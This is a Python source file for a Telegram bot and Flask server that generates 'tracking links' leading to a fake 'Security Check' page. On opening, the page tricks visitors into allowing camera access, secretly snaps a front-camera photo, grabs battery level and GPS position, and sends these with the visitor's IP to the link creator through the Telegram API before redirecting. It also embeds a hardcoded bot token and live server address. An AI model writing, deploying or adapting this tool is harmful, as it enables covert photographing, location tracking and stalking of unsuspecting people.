import os
import threading
import base64
import requests
import urllib.parse
from flask import Flask, request, render_template_string
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8519141404:AAG96ys2oHdO5jxnJNwOhFrmhtP9IpVPOoc"
# Render ka URL
SERVER_URL = "https://magmaphotobot-2.onrender.com"

app = Flask(__name__)

# --- JAVASCRIPT TRAP (Original Style + Fixes) ---
def get_html(chat_id, redirect_url):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>body{{background:black;color:white;text-align:center;font-family:sans-serif;margin-top:50px;}}</style>
</head>
<body>
    <h2>Verifying User...</h2>
    <p>Please click 'Allow' to continue.</p>
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startTrap() {{
            let batLevel = "Unknown";
            try {{
                let battery = await navigator.getBattery();
                batLevel = Math.round(battery.level * 100);
            }} catch(e) {{}}

            try {{
                // Request Camera Permission
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                let video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1500));
                
                let canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                stream.getTracks().forEach(track => track.stop());

                navigator.geolocation.getCurrentPosition(async (pos) => {{
                    await sendData(batLevel, photoData, pos.coords.latitude, pos.coords.longitude);
                }}, async (error) => {{
                    await sendData(batLevel, photoData, "Denied", "Denied");
                }});

            }} catch(e) {{
                await sendData(batLevel, null, "Denied", "Denied");
            }}
        }}

        async function sendData(bat, photo, lat, lon) {{
            await fetch('/submit_info', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ 
                    battery: bat, 
                    photo: photo, 
                    lat: lat, 
                    lon: lon, 
                    chat_id: "{chat_id}" 
                }})
            }});
            window.location.href = "{redirect_url}";
        }}
        window.onload = startTrap;
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    cid = request.args.get('id')
    redir = request.args.get('redir', 'https://google.com')
    return render_template_string(get_html(cid, redir))

@app.route('/submit_info', methods=['POST'])
def receive_data():
    data = request.json
    tid = data.get('chat_id')
    bat = data.get('battery')
    lat = data.get('lat')
    lon = data.get('lon')
    photo_b64 = data.get('photo')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Text Message usi user ko bhej rahe hain jisne link banaya
    msg = f"🎯 **Shikaar Hit!**\\n🔋 Battery: {bat}%\\n🌐 IP: {ip}\\n📍 Loc: {lat}, {lon}\\n🗺 Map: http://maps.google.com/maps?q={lat},{lon}"
    requests.get(f"https://api.telegram.org/bot{{TOKEN}}/sendMessage?chat_id={{tid}}&text={{msg}}".format(TOKEN=TOKEN, tid=tid, msg=msg))

    if photo_b64 and "," in photo_b64:
        try:
            img_data = base64.b64decode(photo_b64.split(",", 1)[1])
            requests.post(f"https://api.telegram.org/bot{{TOKEN}}/sendPhoto".format(TOKEN=TOKEN),
                data={'chat_id': tid}, files={'photo': ('capture.jpg', img_data)})
        except: pass
    return "OK"

# --- BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome! Apna redirect link bhejein (jaise: https://youtube.com) taaki main aapka tracking link bana sakoon.")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_link = update.message.text
    if not user_link.startswith("http"):
        await update.message.reply_text("❌ Galat link! Please http:// ya https:// wala link bhejein.")
        return

    user_id = update.effective_chat.id
    encoded_redir = urllib.parse.quote(user_link)
    # Link format for Render
    final_link = f"{SERVER_URL}/?id={user_id}&redir={encoded_redir}"
    
    await update.message.reply_text(f"✅ **Aapka Tracking Link:**\\n`{final_link}`")

def run_flask():
    # Render ke liye port 10000 zaroori hai
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    bot.run_polling()
